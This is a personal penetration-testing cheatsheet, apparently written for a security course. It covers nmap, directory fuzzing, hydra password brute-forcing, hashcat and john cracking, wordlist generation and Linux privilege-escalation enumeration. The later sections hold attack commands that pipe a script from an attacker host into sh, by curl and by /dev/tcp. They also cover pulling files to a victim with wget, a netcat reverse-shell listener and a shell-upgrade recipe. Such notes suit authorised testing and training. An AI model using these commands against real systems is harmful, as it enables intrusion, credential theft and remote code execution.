### My current Pentest Cheatsheet   
Updated: *05.12.2023*   
[See sources and credits](report.md#y-the-super-ultimate-hakk3r-che33tsheet-001-tee-tiivistelm%C3%A4-omista-ja-kavereiden-parhaista-tunketumistekniikoista-ole-t%C3%A4sm%C3%A4llinen-liit%C3%A4-komennot-mukaan-t%C3%A4m%C3%A4n-kohdan-vastaus-lienee-pidempi-kuin-aiempien-x-teht%C3%A4vien-viittaa-l%C3%A4hteisiin-t%C3%A4ss%C3%A4-alakohdassa-ei-tarvitse-ajaa-komentoja-tietokoneella)

**Nmap:**
```bash
Example: sudo nmap -A -p- <address> -oA filename 
Everything: -A
Enumerate Versions: -sV
Default Scripts: -sC
Syn Scan: -sS
All Ports: -p0-
Output (All Formats): -oA filename
```

**Gobuster**
```bash
# Directories
gobuster dir -w /usr/share/wordlists/dirb/small.txt -u http://address

# Vhosts
gobuster vhost -w /usr/share/wordlists/dirb/small.txt -u address --append-domain
```

**Ffuf**
```bash
# Sites
ffuf -w /path/to/wordlist -u https://target/FUZZ

# Vhosts
ffuf -c -w /path/to/wordlist -u http://ffuf.io.fi -H "Host: FUZZ.ffuf.io.fi"

# Filter out response length
-fs <bytesize>
```

---
**Hydra:**
- SSH   
```bash
Example: hydra -l user -p pass 127.0.0.1 ssh
User: -l
User File: -L
Password: -p
Password File: -P
Port: -s
Tasks: -T
```

**Searchsploit:**
```bash
Example: searchsploit SOMETHING
Read Exploit: -x
Copy to current location: -m
Update: -u
```

**SQLi Cheatsheet:** 
https://portswigger.net/web-security/sql-injection/cheat-sheet

---
**Hashcat:**
```bash
Hash Mode: -m <id>
   0 | MD5
1400 | SHA2-256 
1700 | SHA2-512

Attack Mode: -a <id>
0 for dictionary
---
3 for mask
Masks:
  ?l | low caps
  ?u | high caps
  ?d | numbers
  ?h | numbers + low caps
  ?H | numbers + high caps
  ?s | special characters
  
Workload 1-4: -w <id>
Disable Potfile: --potfile-disable
Show Cracked Hashes: --show
Out File: -o
Usernames in Hashfile: --username
```

**John:**
```bash
john --wordlist=/path/file hash.file
```

**Wordlist Gen:**

**Cewl**
```bash
cewl -w wordlist <url>
```

**Crunch**
```bash
TBA
```

**From a file:**
**Python Script**
```bash
#!/bin/python3
import sys
import re

if len(sys.argv) != 2:
    print("Usage: wordlist_gen <filename>")
    sys.exit(1)

filename = sys.argv[1]

with open(filename, "r") as file:
    for line in file:
        # Replace non-alphanumeric characters with space
        line = re.sub(r"[^\w\s]", " ", line)
        # Split line into words and iterate over them
        for word in line.split():
            print(word)
```

**Sed**
```bash
sed 's/[^a-zA-Z0-9 ]//g; s/ /\n/g; /^$/d' <filename> | tr -s '\n'
```

---
**PrivEsc stuffz:**
```bash
sudo -l
Find Group Owned Files: find / -group <group-name>
Find SUID: find / -perm -4000
Find GUID: find / -perm -2000
Listening Ports: netstat -tulnp
Listening Ports: ss -ltnp
Find World Writeable: find / -perm -o+w
```
**Find**
- Disable "permission denied and stuffs" printing:   
```bash
find / -name <something> 2>/dev/null
```

**Good place to put exploits, scripts and stuffs on victim:**   
```bash
 /dev/shm/
 /tmp/
```

**Send files from Attacker to Target:**     
```bash
sudo python -m http.server PORT #Host
wget ATTACKERIP:PORT/filename #Victim
```
OR:   
**Run script over the network:**   
```bash
# Local network
sudo python3 -m http.server 80 #Host
curl <ip_address>/script.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < script.sh #Host
cat < /dev/tcp/<ip_address>/<port> | sh #Victim
```
Source: [Linpeass](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

**Reverse shells:**   
Host, netcat listener:    
```bash
nc -lvnp PORTNUMBER  
```
Shells:   
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet   
https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/

---
**Improved shell:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

CTRL + z

stty raw -echo; fg
export TERM=xterm
```
